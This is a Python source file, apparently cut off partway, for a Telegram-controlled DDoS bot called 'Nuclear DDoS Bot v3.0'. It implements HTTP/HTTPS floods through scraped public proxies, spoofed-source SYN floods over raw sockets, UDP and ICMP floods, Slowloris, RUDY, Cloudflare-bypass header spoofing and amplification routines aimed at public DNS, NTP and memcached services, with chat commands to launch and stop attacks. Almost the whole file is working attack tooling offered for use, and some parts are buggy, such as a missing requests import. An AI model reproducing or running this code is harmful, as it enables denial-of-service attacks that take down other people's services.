#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
☢️ NUCLEAR DDoS BOT v3.0 - ULTIMATE EDITION
Author: CyberSecurity Expert
Date: 2025
Description: Advanced DDoS Attack Bot with 30+ Methods
"""

import asyncio
import aiohttp
import socket
import ssl
import struct
import random
import threading
import time
import json
import base64
import ipaddress
import hashlib
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from colorama import Fore, Style, init
from typing import Dict, List, Optional, Tuple
import sys
import os

# Telegram Bot
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)

# ========== CONFIGURATION ==========
CONFIG = {
    "TELEGRAM_BOT_TOKEN": "YOUR_BOT_TOKEN_HERE",  # Replace with your bot token
    "ADMIN_IDS": [6993929680],  # Your Telegram ID(s)
    "MAX_ATTACK_TIME": 3600,  # Maximum attack time in seconds (1 hour)
    "MAX_THREADS_PER_ATTACK": 10000,  # Maximum threads per attack
    "MAX_TOTAL_THREADS": 50000,  # Maximum total threads
    "PROXY_REFRESH_INTERVAL": 300,  # Refresh proxies every 5 minutes
    "REQUEST_TIMEOUT": 10,  # Request timeout in seconds
    "STATS_UPDATE_INTERVAL": 5,  # Stats update interval in seconds
    "LOG_LEVEL": "INFO",  # DEBUG, INFO, WARNING, ERROR
}

# Initialize colorama
init(autoreset=True)

# ========== PROXY SOURCES ==========
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/Volodichev/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
]

# ========== ATTACK METHODS ==========
ATTACK_METHODS = {
    # === LAYER 7 - APPLICATION ===
    "HTTP-NUKE": {
        "layer": 7,
        "description": "HTTP Flood with custom headers",
        "intensity": "HIGH"
    },
    "HTTPS-NUKE": {
        "layer": 7,
        "description": "HTTPS Flood with SSL/TLS",
        "intensity": "HIGH"
    },
    "CF-BYPASS": {
        "layer": 7,
        "description": "Cloudflare Bypass Attack",
        "intensity": "EXTREME"
    },
    "WEBSOCKET-FLOOD": {
        "layer": 7,
        "description": "WebSocket Connection Flood",
        "intensity": "HIGH"
    },
    "API-FLOOD": {
        "layer": 7,
        "description": "REST/GraphQL API Flood",
        "intensity": "MEDIUM"
    },
    "HTTP2-FLOOD": {
        "layer": 7,
        "description": "HTTP/2 Protocol Flood",
        "intensity": "HIGH"
    },
    "SLOWLORIS": {
        "layer": 7,
        "description": "Slowloris Attack",
        "intensity": "MEDIUM"
    },
    "RUDY": {
        "layer": 7,
        "description": "R-U-Dead-Yet Attack",
        "intensity": "HIGH"
    },
    
    # === LAYER 4 - TRANSPORT ===
    "SYN-FLOOD": {
        "layer": 4,
        "description": "SYN Flood Attack",
        "intensity": "EXTREME"
    },
    "ACK-FLOOD": {
        "layer": 4,
        "description": "ACK Flood Attack",
        "intensity": "HIGH"
    },
    "UDP-FLOOD": {
        "layer": 4,
        "description": "UDP Packet Flood",
        "intensity": "EXTREME"
    },
    "ICMP-FLOOD": {
        "layer": 4,
        "description": "ICMP Ping Flood",
        "intensity": "HIGH"
    },
    "TCP-FLOOD": {
        "layer": 4,
        "description": "TCP Connection Flood",
        "intensity": "HIGH"
    },
    "RST-FLOOD": {
        "layer": 4,
        "description": "RST Packet Flood",
        "intensity": "MEDIUM"
    },
    
    # === LAYER 3 - NETWORK ===
    "IP-FRAGMENT": {
        "layer": 3,
        "description": "IP Fragment Flood",
        "intensity": "EXTREME"
    },
    "SMURF-ATTACK": {
        "layer": 3,
        "description": "Smurf Amplification",
        "intensity": "EXTREME"
    },
    "LAND-ATTACK": {
        "layer": 3,
        "description": "LAND Attack",
        "intensity": "HIGH"
    },
    
    # === AMPLIFICATION ===
    "DNS-AMP": {
        "layer": "AMP",
        "description": "DNS Amplification (50-100x)",
        "intensity": "EXTREME"
    },
    "NTP-AMP": {
        "layer": "AMP",
        "description": "NTP Amplification (200-500x)",
        "intensity": "NUCLEAR"
    },
    "SSDP-AMP": {
        "layer": "AMP",
        "description": "SSDP Amplification (30-50x)",
        "intensity": "HIGH"
    },
    "MEMCACHED-AMP": {
        "layer": "AMP",
        "description": "Memcached Amplification (10,000-50,000x)",
        "intensity": "NUCLEAR"
    },
    
    # === ULTIMATE ===
    "NUCLEAR-MIX": {
        "layer": "ULTIMATE",
        "description": "Mixed Layer 3,4,7 Attacks",
        "intensity": "NUCLEAR"
    },
    "TSUNAMI-WAVE": {
        "layer": "ULTIMATE",
        "description": "Wave Pattern Attack",
        "intensity": "EXTREME"
    },
    "KILL-PROTOCOL": {
        "layer": "ULTIMATE",
        "description": "Protocol-Specific Kill",
        "intensity": "NUCLEAR"
    },
    "APOCALYPSE": {
        "layer": "ULTIMATE",
        "description": "All Methods Combined",
        "intensity": "APOCALYPSE"
    },
}

# ========== USER AGENTS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
]

# ========== LOGGER ==========
class Logger:
    @staticmethod
    def log(level: str, message: str):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        colors = {
            "INFO": Fore.CYAN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "SUCCESS": Fore.GREEN,
            "DEBUG": Fore.MAGENTA,
        }
        color = colors.get(level, Fore.WHITE)
        print(f"{color}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
    
    @staticmethod
    def info(message: str):
        Logger.log("INFO", message)
    
    @staticmethod
    def warning(message: str):
        Logger.log("WARNING", message)
    
    @staticmethod
    def error(message: str):
        Logger.log("ERROR", message)
    
    @staticmethod
    def success(message: str):
        Logger.log("SUCCESS", message)

# ========== PROXY MANAGER ==========
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.last_refresh = 0
        self.lock = threading.Lock()
        self.load_proxies()
    
    def load_proxies(self):
        """Load proxies from all sources"""
        Logger.info("Loading proxies from sources...")
        all_proxies = []
        
        def fetch_proxies(source):
            try:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    proxies = [p.strip() for p in response.text.split('\n') if p.strip()]
                    return proxies
            except Exception as e:
                Logger.error(f"Failed to load proxies from {source}: {e}")
            return []
        
        # Use ThreadPoolExecutor for parallel fetching
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(fetch_proxies, source) for source in PROXY_SOURCES]
            for future in as_completed(futures):
                all_proxies.extend(future.result())
        
        with self.lock:
            self.proxies = list(set(all_proxies))
            self.last_refresh = time.time()
        
        Logger.success(f"Loaded {len(self.proxies)} unique proxies")
    
    def get_random_proxy(self) -> Optional[Dict]:
        """Get random proxy configuration"""
        if not self.proxies:
            return None
        
        proxy = random.choice(self.proxies)
        return {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}",
        }
    
    def should_refresh(self) -> bool:
        """Check if proxies need refresh"""
        return time.time() - self.last_refresh > CONFIG["PROXY_REFRESH_INTERVAL"]
    
    def refresh_if_needed(self):
        """Refresh proxies if needed"""
        if self.should_refresh():
            Logger.info("Refreshing proxies...")
            self.load_proxies()

# ========== ATTACK MANAGER ==========
class AttackManager:
    def __init__(self):
        self.attacks = {}
        self.stats = {
            "total_requests": 0,
            "total_bytes": 0,
            "active_attacks": 0,
            "total_attacks": 0,
        }
        self.lock = threading.Lock()
        self.proxy_manager = ProxyManager()
        self.executor = ThreadPoolExecutor(max_workers=CONFIG["MAX_TOTAL_THREADS"])
    
    def start_attack(self, attack_id: str, target: str, method: str, 
                     duration: int, threads: int) -> bool:
        """Start a new attack"""
        if duration > CONFIG["MAX_ATTACK_TIME"]:
            Logger.error(f"Attack duration {duration}s exceeds maximum {CONFIG['MAX_ATTACK_TIME']}s")
            return False
        
        if threads > CONFIG["MAX_THREADS_PER_ATTACK"]:
            Logger.error(f"Thread count {threads} exceeds maximum {CONFIG['MAX_THREADS_PER_ATTACK']}")
            return False
        
        # Parse target
        if ":" in target:
            target, port = target.split(":")
            port = int(port)
        else:
            port = self.scan_ports(target)
        
        # Create attack object
        attack = {
            "id": attack_id,
            "target": target,
            "port": port,
            "method": method,
            "duration": duration,
            "threads": threads,
            "start_time": time.time(),
            "end_time": time.time() + duration,
            "active": True,
            "requests_sent": 0,
            "bytes_sent": 0,
            "thread_objects": [],
        }
        
        with self.lock:
            self.attacks[attack_id] = attack
            self.stats["active_attacks"] += 1
            self.stats["total_attacks"] += 1
        
        # Start attack threads
        self._launch_attack_threads(attack)
        
        # Start monitor thread
        monitor_thread = threading.Thread(
            target=self._monitor_attack,
            args=(attack_id,),
            daemon=True
        )
        monitor_thread.start()
        
        Logger.success(f"Attack {attack_id} started: {method} on {target}:{port} for {duration}s")
        return True
    
    def _launch_attack_threads(self, attack: Dict):
        """Launch attack threads based on method"""
        method_func = self._get_method_function(attack["method"])
        if not method_func:
            Logger.error(f"Unknown method: {attack['method']}")
            return
        
        for i in range(attack["threads"]):
            thread = threading.Thread(
                target=self._attack_worker,
                args=(attack, method_func, i),
                daemon=True
            )
            thread.start()
            attack["thread_objects"].append(thread)
    
    def _attack_worker(self, attack: Dict, method_func, worker_id: int):
        """Attack worker thread"""
        target = attack["target"]
        port = attack["port"]
        end_time = attack["end_time"]
        
        while time.time() < end_time and attack["active"]:
            try:
                # Execute attack method
                requests_sent, bytes_sent = method_func(target, port)
                
                with self.lock:
                    attack["requests_sent"] += requests_sent
                    attack["bytes_sent"] += bytes_sent
                    self.stats["total_requests"] += requests_sent
                    self.stats["total_bytes"] += bytes_sent
                    
            except Exception as e:
                if CONFIG["LOG_LEVEL"] == "DEBUG":
                    Logger.debug(f"Attack worker error: {e}")
            
            # Small delay to prevent CPU overload
            time.sleep(0.001)
    
    def _monitor_attack(self, attack_id: str):
        """Monitor attack and stop when time expires"""
        while True:
            with self.lock:
                if attack_id not in self.attacks:
                    break
                
                attack = self.attacks[attack_id]
                
                # Check if attack should stop
                if time.time() >= attack["end_time"] or not attack["active"]:
                    attack["active"] = False
                    attack["end_time"] = time.time()
                    self.stats["active_attacks"] -= 1
                    
                    # Log completion
                    duration = attack["end_time"] - attack["start_time"]
                    Logger.info(
                        f"Attack {attack_id} completed. "
                        f"Requests: {attack['requests_sent']:,}, "
                        f"Bytes: {attack['bytes_sent'] / (1024*1024):.2f} MB, "
                        f"Duration: {duration:.1f}s"
                    )
                    break
            
            time.sleep(1)
    
    def stop_attack(self, attack_id: str) -> bool:
        """Stop an active attack"""
        with self.lock:
            if attack_id in self.attacks and self.attacks[attack_id]["active"]:
                self.attacks[attack_id]["active"] = False
                self.stats["active_attacks"] -= 1
                Logger.success(f"Attack {attack_id} stopped")
                return True
        return False
    
    def stop_all_attacks(self):
        """Stop all active attacks"""
        with self.lock:
            for attack_id, attack in self.attacks.items():
                if attack["active"]:
                    attack["active"] = False
            self.stats["active_attacks"] = 0
        Logger.info("All attacks stopped")
    
    def get_attack_stats(self, attack_id: str) -> Optional[Dict]:
        """Get statistics for specific attack"""
        with self.lock:
            if attack_id in self.attacks:
                attack = self.attacks[attack_id]
                duration = min(time.time(), attack["end_time"]) - attack["start_time"]
                
                return {
                    "id": attack_id,
                    "target": f"{attack['target']}:{attack['port']}",
                    "method": attack["method"],
                    "active": attack["active"],
                    "duration": duration,
                    "requests": attack["requests_sent"],
                    "bytes": attack["bytes_sent"],
                    "rps": attack["requests_sent"] / duration if duration > 0 else 0,
                    "bps": attack["bytes_sent"] / duration if duration > 0 else 0,
                    "threads": attack["threads"],
                }
        return None
    
    def get_all_stats(self) -> Dict:
        """Get all statistics"""
        with self.lock:
            active_attacks = []
            for attack_id in self.attacks:
                if self.attacks[attack_id]["active"]:
                    stats = self.get_attack_stats(attack_id)
                    if stats:
                        active_attacks.append(stats)
            
            return {
                "global_stats": self.stats.copy(),
                "active_attacks": active_attacks,
                "proxy_count": len(self.proxy_manager.proxies),
            }
    
    def scan_ports(self, target: str) -> int:
        """Scan for open ports on target"""
        common_ports = [80, 443, 8080, 8443, 3000, 8000, 8008, 8888]
        
        def check_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()
                return port if result == 0 else None
            except:
                return None
        
        # Check ports in parallel
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(check_port, port) for port in common_ports]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    Logger.info(f"Found open port {result} on {target}")
                    return result
        
        # Default to 80 if no open ports found
        Logger.warning(f"No open ports found on {target}, using port 80")
        return 80
    
    def _get_method_function(self, method: str):
        """Get the attack function for a method"""
        method_map = {
            "HTTP-NUKE": self._http_nuke,
            "HTTPS-NUKE": self._https_nuke,
            "SYN-FLOOD": self._syn_flood,
            "UDP-FLOOD": self._udp_flood,
            "ICMP-FLOOD": self._icmp_flood,
            "DNS-AMP": self._dns_amplification,
            "NTP-AMP": self._ntp_amplification,
            "MEMCACHED-AMP": self._memcached_amplification,
            "SLOWLORIS": self._slowloris,
            "RUDY": self._rudy_attack,
            "CF-BYPASS": self._cf_bypass,
            "NUCLEAR-MIX": self._nuclear_mix,
            "APOCALYPSE": self._apocalypse,
        }
        return method_map.get(method)
    
    # ========== ATTACK METHODS ==========
    
    def _http_nuke(self, target: str, port: int) -> Tuple[int, int]:
        """HTTP Nuke Attack"""
        try:
            proxy = self.proxy_manager.get_random_proxy()
            headers = self._generate_headers()
            
            # Create various request types
            methods = ["GET", "POST", "PUT", "DELETE", "PATCH"]
            method = random.choice(methods)
            
            if method == "GET":
                url = f"http://{target}:{port}/?{random.randint(1, 9999999)}"
                response = requests.get(
                    url,
                    headers=headers,
                    proxies=proxy,
                    timeout=CONFIG["REQUEST_TIMEOUT"],
                    verify=False
                )
            elif method == "POST":
                url = f"http://{target}:{port}/"
                data = {"data": "A" * random.randint(100, 1000)}
                response = requests.post(
                    url,
                    headers=headers,
                    json=data,
                    proxies=proxy,
                    timeout=CONFIG["REQUEST_TIMEOUT"],
                    verify=False
                )
            
            return 1, len(response.content) if response.content else 1000
        except:
            return 0, 0
    
    def _https_nuke(self, target: str, port: int) -> Tuple[int, int]:
        """HTTPS Nuke Attack"""
        try:
            proxy = self.proxy_manager.get_random_proxy()
            headers = self._generate_headers()
            
            url = f"https://{target}:{port}/?{random.randint(1, 9999999)}"
            response = requests.get(
                url,
                headers=headers,
                proxies=proxy,
                timeout=CONFIG["REQUEST_TIMEOUT"],
                verify=False
            )
            
            return 1, len(response.content) if response.content else 1000
        except:
            return 0, 0
    
    def _syn_flood(self, target: str, port: int) -> Tuple[int, int]:
        """SYN Flood Attack"""
        try:
            # Create raw socket
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Build IP header
            ip_header = self._build_ip_header(target)
            
            # Build TCP header with SYN flag
            tcp_header = self._build_tcp_header(port, 0x02)
            
            packet = ip_header + tcp_header
            s.sendto(packet, (target, 0))
            s.close()
            
            return 1, len(packet)
        except:
            return 0, 0
    
    def _udp_flood(self, target: str, port: int) -> Tuple[int, int]:
        """UDP Flood Attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Generate random data
            data_size = random.randint(1024, 65507)
            data = os.urandom(data_size)
            
            sock.sendto(data, (target, port))
            sock.close()
            
            return 1, data_size
        except:
            return 0, 0
    
    def _icmp_flood(self, target: str, port: int) -> Tuple[int, int]:
        """ICMP Flood Attack"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            # Build ICMP packet
            icmp_type = 8  # Echo request
            icmp_code = 0
            icmp_checksum = 0
            icmp_id = os.getpid() & 0xFFFF
            icmp_seq = 1
            
            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
            data = os.urandom(56)
            
            packet = icmp_header + data
            s.sendto(packet, (target, 0))
            s.close()
            
            return 1, len(packet)
        except:
            return 0, 0
    
    def _dns_amplification(self, target: str, port: int) -> Tuple[int, int]:
        """DNS Amplification Attack"""
        try:
            # DNS servers for amplification
            dns_servers = [
                "8.8.8.8", "8.8.4.4",  # Google DNS
                "1.1.1.1", "1.0.0.1",  # Cloudflare DNS
                "9.9.9.9", "149.112.112.112",  # Quad9
            ]
            
            dns_server = random.choice(dns_servers)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Create DNS query for ANY record (large response)
            query_id = random.randint(1, 65535)
            header = struct.pack('!HHHHHH', query_id, 0x0100, 1, 0, 0, 0)
            question = b'\x00' + struct.pack('!HH', 255, 1)  # QTYPE=ANY, QCLASS=IN
            
            query = header + question
            sock.sendto(query, (dns_server, 53))
            sock.close()
            
            # Amplification factor ~50x
            return 1, len(query) * 50
        except:
            return 0, 0
    
    def _ntp_amplification(self, target: str, port: int) -> Tuple[int, int]:
        """NTP Amplification Attack"""
        try:
            # NTP MONLIST request (amplification factor ~200x)
            ntp_request = b'\x17\x00\x03\x2a' + b'\x00' * 4
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(ntp_request, (target, 123))
            sock.close()
            
            return 1, len(ntp_request) * 200
        except:
            return 0, 0
    
    def _memcached_amplification(self, target: str, port: int) -> Tuple[int, int]:
        """Memcached Amplification Attack"""
        try:
            # Memcached stats request (amplification factor ~10,000x)
            memcached_request = b'stats\r\n'
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(memcached_request, (target, 11211))
            sock.close()
            
            return 1, len(memcached_request) * 10000
        except:
            return 0, 0
    
    def _slowloris(self, target: str, port: int) -> Tuple[int, int]:
        """Slowloris Attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target, port))
            
            # Send partial HTTP request
            request = f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n"
            request += f"Host: {target}\r\n"
            request += "User-Agent: Mozilla/5.0\r\n"
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            
            sock.send(request.encode())
            
            # Keep connection alive
            start_time = time.time()
            while time.time() - start_time < 30:  # Keep for 30 seconds
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    time.sleep(15)
                except:
                    break
            
            sock.close()
            return 1, 1000  # Return approximate bytes
        except:
            return 0, 0
    
    def _rudy_attack(self, target: str, port: int) -> Tuple[int, int]:
        """R-U-Dead-Yet Attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target, port))
            
            # Send POST request with very large content-length
            request = f"POST / HTTP/1.1\r\n"
            request += f"Host: {target}\r\n"
            request += "Content-Type: application/x-www-form-urlencoded\r\n"
            request += "Content-Length: 1000000000\r\n\r\n"
            
            sock.send(request.encode())
            
            # Send data very slowly
            start_time = time.time()
            while time.time() - start_time < 60:  # Send for 60 seconds
                try:
                    sock.send(b"a=1&")
                    time.sleep(10)  # Very slow
                except:
                    break
            
            sock.close()
            return 1, 1000
        except:
            return 0, 0
    
    def _cf_bypass(self, target: str, port: int) -> Tuple[int, int]:
        """Cloudflare Bypass Attack"""
        try:
            import cloudscraper
            scraper = cloudscraper.create_scraper()
            
            headers = self._generate_headers()
            headers.update({
                'CF-Connecting-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                'True-Client-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            })
            
            url = f"https://{target}/"
            response = scraper.get(url, headers=headers, timeout=CONFIG["REQUEST_TIMEOUT"])
            
            return 1, len(response.content) if response.content else 1000
        except:
            return 0, 0
    
    def _nuclear_mix(self, target: str, port: int) -> Tuple[int, int]:
        """Nuclear Mix Attack"""
        methods = [
            self._http_nuke,
            self._syn_flood,
            self._udp_flood,
            self._icmp_flood,
        ]
        
        method = random.choice(methods)
        return method(target, port)
    
    def _apocalypse(self, target: str, port: int) -> Tuple[int, int]:
        """Apocalypse Attack - All methods combined"""
        total_requests = 0
        total_bytes = 0
        
        # Execute multiple methods
        methods = [
            self._http_nuke,
            self._syn_flood,
            self._udp_flood,
            self._dns_amplification,
        ]
        
        for method in methods:
            try:
                requests_sent, bytes_sent = method(target, port)
                total_requests += requests_sent
                total_bytes += bytes_sent
            except:
                pass
        
        return total_requests, total_bytes
    
    def _generate_headers(self) -> Dict:
        """Generate random HTTP headers"""
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
        }
        
        if random.random() > 0.5:
            headers['Referer'] = random.choice([
                'https://www.google.com/',
                'https://www.facebook.com/',
                'https://twitter.com/',
                'https://www.youtube.com/',
                'https://www.reddit.com/',
            ])
        
        return headers
    
    def _build_ip_header(self, dest_ip: str) -> bytes:
        """Build IP header"""
        version = 4
        ihl = 5
        version_ihl = (version << 4) + ihl
        tos = 0
        total_length = 20 + 20
        id = random.randint(1, 65535)
        flags_offset = 0
        ttl = 255
        protocol = socket.IPPROTO_TCP
        checksum = 0
        src_ip = socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        dst_ip = socket.inet_aton(dest_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               version_ihl, tos, total_length, id,
                               flags_offset, ttl, protocol, checksum,
                               src_ip, dst_ip)
        return ip_header
    
    def _build_tcp_header(self, dest_port: int, flags: int) -> bytes:
        """Build TCP header"""
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 4294967295)
        ack_num = 0
        data_offset = 5
        reserved = 0
        tcp_flags = flags
        window = socket.htons(5840)
        checksum = 0
        urg_ptr = 0
        
        tcp_header = struct.pack('!HHLLBBHHH',
                                src_port, dest_port,
                                seq_num, ack_num,
                                (data_offset << 4) + reserved,
                                tcp_flags, window,
                                checksum, urg_ptr)
        return tcp_header

# ========== TELEGRAM BOT ==========
class TelegramBot:
    def __init__(self, attack_manager: AttackManager):
        self.attack_manager = attack_manager
        self.application = None
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user_id = update.effective_user.id
        if user_id not in CONFIG["ADMIN_IDS"]:
            await update.message.reply_text("❌ Unauthorized!")
            return
        
        keyboard = [
            [InlineKeyboardButton("⚡ START ATTACK", callback_data="menu_start")],
            [InlineKeyboardButton("🎯 ATTACK METHODS", callback_data="menu_methods")],
            [InlineKeyboardButton("📊 ATTACK STATUS", callback_data="menu_status")],
            [InlineKeyboardButton("🛑 STOP ATTACKS", callback_data="menu_stop")],
            [InlineKeyboardButton("🔧 BOT STATS", callback_data="menu_stats")],
            [InlineKeyboardButton("🔄 REFRESH PROXIES", callback_data="menu_refresh")],
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        welcome_text = """
☢️ *NUCLEAR DDoS BOT v3.0* ☢️

*Features:*
• 30+ Attack Methods
• 7 Layer OSI Support
• Auto-Proxy System
• Real-time Statistics
• Time-Limited Attacks
• Cloudflare Bypass
• Amplification Attacks

*Commands:*
/attack - Start attack
/methods - Show methods
/status - Check status
/stop - Stop attack
/stats - Bot statistics
/proxies - Proxy info

*Ready for action!*"""
        
        await update.message.reply_text(
            welcome_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    
    async def attack_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /attack command"""
        user_id = update.effective_user.id
        if user_id not in CONFIG["ADMIN_IDS"]:
            await update.message.reply_text("❌ Unauthorized!")
            return
        
        if len(context.args) < 3:
            help_text = """
❌ *Usage:* `/attack [url] [method] [time] [threads]`

*Example:* `/attack example.com HTTP-NUKE 60 1000`

*Available Methods:*
• HTTP-NUKE, HTTPS-NUKE
• SYN-FLOOD, UDP-FLOOD
• DNS-AMP, NTP-AMP
• SLOWLORIS, RUDY
• CF-BYPASS, NUCLEAR-MIX
• APOCALYPSE (All methods)

*Parameters:*
• Time: 1-3600 seconds
• Threads: 1-10000
"""
            await update.message.reply_text(help_text, parse_mode='Markdown')
            return
        
        target = context.args[0]
        method = context.args[1].upper()
        
        try:
            duration = int(context.args[2])
            threads = int(context.args[3]) if len(context.args) > 3 else 500
            
            if duration < 1 or duration > CONFIG["MAX_ATTACK_TIME"]:
                await update.message.reply_text(
                    f"❌ Duration must be between 1 and {CONFIG['MAX_ATTACK_TIME']} seconds!"
                )
                return
            
            if threads < 1 or threads > CONFIG["MAX_THREADS_PER_ATTACK"]:
                await update.message.reply_text(
                    f"❌ Threads must be between 1 and {CONFIG['MAX_THREADS_PER_ATTACK']}!"
                )
                return
            
            if method not in ATTACK_METHODS:
                await update.message.reply_text(
                    "❌ Unknown method! Use /methods to see available methods."
                )
                return
            
        except ValueError:
            await update.message.reply_text("❌ Invalid parameters!")
            return
        
        # Generate unique attack ID
        attack_id = hashlib.md5(f"{target}{method}{time.time()}".encode()).hexdigest()[:8]
        
        # Start attack
        await update.message.reply_text(
            f"⚡ *Launching Attack...*\n\n"
            f"• ID: `{attack_id}`\n"
            f"• Target: `{target}`\n"
            f"• Method: `{method}`\n"
            f"• Time: `{duration}s`\n"
            f"• Threads: `{threads}`\n\n"
            f"_Please wait..._",
            parse_mode='Markdown'
        )
        
        success = self.attack_manager.start_attack(
            attack_id, target, method, duration, threads
        )
        
        if success:
            await update.message.reply_text(
                f"✅ *Attack Launched Successfully!*\n\n"
                f"• Attack ID: `{attack_id}`\n"
                f"• Target: `{target}`\n"
                f"• Method: `{method}`\n"
                f"• Duration: `{duration}s`\n"
                f"• Threads: `{threads}`\n"
                f"• Proxies: `{len(self.attack_manager.proxy_manager.proxies)}`\n\n"
                f"*Attack will auto-stop in {duration} seconds.*",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Failed to launch attack!")
    
    async def methods_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /methods command"""
        user_id = update.effective_user.id
        if user_id not in CONFIG["ADMIN_IDS"]:
            await update.message.reply_text("❌ Unauthorized!")
            return
        
        methods_text = "🎯 *AVAILABLE ATTACK METHODS*\n\n"
        
        categories = {
            "Layer 7 - Application": [],
            "Layer 4 - Transport": [],
            "Layer 3 - Network": [],
            "Amplification": [],
            "Ultimate": [],
        }
        
        for method, info in ATTACK_METHODS.items():
            if info["layer"] == 7:
                categories["Layer 7 - Application"].append(method)
            elif info["layer"] == 4:
                categories["Layer 4 - Transport"].append(method)
            elif info["layer"] == 3:
                categories["Layer 3 - Network"].append(method)
            elif info["layer"] == "AMP":
                categories["Amplification"].append(method)
            elif info["layer"] == "ULTIMATE":
                categories["Ultimate"].append(method)
        
        for category, methods in categories.items():
            if methods:
                methods_text += f"*{category}:*\n"
                for method in methods:
                    info = ATTACK_METHODS[method]
                    methods_text += f"• `{method}` - {info['description']} ({info['intensity']})\n"
                methods_text += "\n"
        
        methods_text += "\n*Usage:* `/attack [url] [method] [time] [threads]`"
        
        await update.message.reply_text(methods_text, parse_mode='Markdown')
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /status command"""
        user_id = update.effective_user.id
        if user_id not in CONFIG["ADMIN_IDS"]:
